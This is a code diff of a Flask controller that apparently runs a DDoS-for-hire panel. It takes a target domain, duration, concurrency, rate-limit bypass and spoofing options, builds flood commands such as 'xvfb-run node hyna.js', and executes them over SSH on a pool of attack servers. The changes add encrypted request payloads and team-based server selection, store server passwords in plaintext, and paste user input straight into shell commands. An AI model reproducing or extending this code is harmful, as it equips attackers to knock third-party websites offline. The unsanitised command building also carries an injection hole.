@@ -1,15 +1,29 @@
 from flask import jsonify, request, current_app
 from app.extensions import socketio
 from app.models.attack_log import AttackLog
+from app.models.team import Team
+from app.models.user import User
+from app.models.server import Server
+from app.configs.blacklist import BLACKLISTED_DOMAINS, MAX_ATTACK_ATTEMPTS
+from app.configs.whitelist import WHITELISTED_IPS
+from app.configs.servers import ATTACK_SERVERS
+from app.models.attack_server_log import AttackServerLog
+from cryptography.hazmat.primitives import serialization
 from app.db import db
 import paramiko
 import threading
 import json
-from app.configs.blacklist import BLACKLISTED_DOMAINS, MAX_ATTACK_ATTEMPTS
-from app.models.user import User
-from app.configs.whitelist import WHITELISTED_IPS
-from app.configs.servers import ATTACK_SERVERS
-from app.models.attack_server_log import AttackServerLog
+import os
+from app.utils.decrypt_payload import decrypt_payload
+
+BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+private_key_path = os.path.join(BASE_DIR, 'configs', 'private_key.pem')
+
+with open(private_key_path, 'rb') as key_file:
+    private_key = serialization.load_pem_private_key(
+        key_file.read(),
+        password=None
+    )
 
 class AttackController:
     # Add class variable to store active channels
@@ -113,8 +127,8 @@ class AttackController:
             
             print(f"Executing command on {server['hostName']}: {command}")
             success, error = self._executeRemoteCommand(
-                server['hostName'],
-                server['userName'],
+                server['ip'],
+                server['username'],
                 server['password'],
                 command,
                 socketId,
@@ -122,14 +136,14 @@ class AttackController:
             )
             
             if success:
-                successfulServers.append(server['hostName'])
+                successfulServers.append(server['ip'])
             else:
                 errors.append(f"Server {server['hostName']}: {error}")
 
         return successfulServers, errors
 
     def attack(self):
-        # Check if client IP is whitelisted
+        
         clientIp = request.remote_addr
         if clientIp not in WHITELISTED_IPS:
             return jsonify({
@@ -139,8 +153,12 @@ class AttackController:
 
         currentUser = request.currentUser
         data = request.get_json()
+
+        try:    
+            payload = decrypt_payload(data, private_key)
+        except Exception as e:
+            return jsonify({"status": "error", "message": str(e)}), 400
         
-        # Check if user is active and hasn't exceeded max attempts
         user = User.query.get(currentUser['id'])
         if not user.status:
             return jsonify({
@@ -148,26 +166,25 @@ class AttackController:
                 "message": "Your account has been deactivated"
             }), 400
 
-        # Check for MAX_ATTACK_ATTEMPTS before proceeding
         if user.attackCount >= MAX_ATTACK_ATTEMPTS:
             user.deactivate()
             return jsonify({
                 "status": "error",
                 "message": f"You have exceeded the maximum number of attacks ({MAX_ATTACK_ATTEMPTS}). Your account has been deactivated"
             }), 400
-
+        
         socketId = data.get('sid', '')
-        domainName = data.get('domain')
-        attackTimeValue = data.get('attack_time')
-        bypassRateLimitValue = str(data.get('bypass_ratelimit')).lower()
-        coreStrengthValue = data.get('core_strength')
-        modeValue = data.get('mode')
-        concurrentValue = data.get('concurrents')
-        requestCount = data.get('request')
-        spoof = data.get('spoof', '')
-        death_sword_http = data.get('death_sword_http', '')
+        domainName = payload.get('domain')
+        attackTimeValue = payload.get('attack_time')
+        bypassRateLimitValue = str(payload.get('bypass_ratelimit')).lower()
+        coreStrengthValue = payload.get('core_strength')
+        modeValue = payload.get('mode')
+        concurrentValue = payload.get('concurrents')
+        requestCount = payload.get('request')
+        spoof = payload.get('spoof', '')
+        death_sword_http = payload.get('death_sword_http', '')
         death_sword_http = str(death_sword_http) if death_sword_http is not None else ""
-        typeAttack = data.get('typeAttack')
+        typeAttack = payload.get('typeAttack')
 
         # Check blacklisted domains
         for blacklisted in BLACKLISTED_DOMAINS:
@@ -197,32 +214,52 @@ class AttackController:
                 "status": "error",
                 "message": "Domain is required"
             }), 400
-
-        # Get target servers from request
-        data = request.get_json()
-        targetServers = data.get('servers', None)
+        servers_to_use = []
         
-        # Filter servers if specific ones are requested
-        selectedServers = None
-        if targetServers:
-            selectedServers = [
-                server for server in ATTACK_SERVERS 
-                if server['hostName'] in targetServers
-            ]
-            if not selectedServers:
-                return jsonify({
-                    "status": "error",
-                    "message": "No valid servers found in the request"
-                }), 400 
+        if currentUser:
+            team = Team.query.get(currentUser['team_id'])        
+            if team:
+                server_ids = team.servers  
+                if not server_ids:
+                    return jsonify({
+                        'status': 'error',
+                        'message': 'No server available for this team'
+                    }), 400
+                servers_to_use = [
+                    {
+                        'ip': server.ip,
+                        'username': server.username,
+                        'password': server.password
+                    } 
+                    for server in Server.query.filter(Server.id.in_(server_ids)).all()
+                ]
+            else:
+                target_server_ids = payload.get('servers', [])
+                if not target_server_ids:
+                    return jsonify({
+                        'status': 'error',
+                        'message': 'SERVER REQUIRED'
+                    }), 400
+                
+                for id in target_server_ids:
+                    server = Server.query.get(id)
+                    if server is None:
+                        return jsonify({
+                            'status': 'error',
+                            'message': 'One or more servers specified do not exist'
+                        }), 400
+                    servers_to_use.append({
+                        'ip': server.ip,
+                        'username': server.username,
+                        'password': server.password
+                    })
 
-        if modeValue == 'xvfb-run node hyna.js':
-            attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --ratelimit {bypassRateLimitValue}'
+        if modeValue == 'xvfb-run /root/.nvm/versions/node/v20.18.3/bin/node hyna.js':
+            attackCommand = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --debug true {bypassRateLimitValue}'
         else:
-            attackCommand = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} {death_sword_http} --ratelimit {bypassRateLimitValue} --bypass true --auth true --debug true'
+            attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} {bypassRateLimitValue}'
         attackCommand = ' '.join(attackCommand.split())
 
-        print(attackCommand)
-        # Create attack log entry
         attackLog = AttackLog(
             userId=currentUser['id'],
             domainName=domainName,
@@ -232,7 +269,6 @@ class AttackController:
             command=attackCommand,
             headers=json.dumps(headers) if headers else None
         )
-        print(attackCommand)
         db.session.add(attackLog)
         db.session.commit()
 
@@ -241,7 +277,7 @@ class AttackController:
             attackCommand,
             socketId,
             attackLog.id,
-            selectedServers
+            servers_to_use
         )
 
         if not successfulServers:
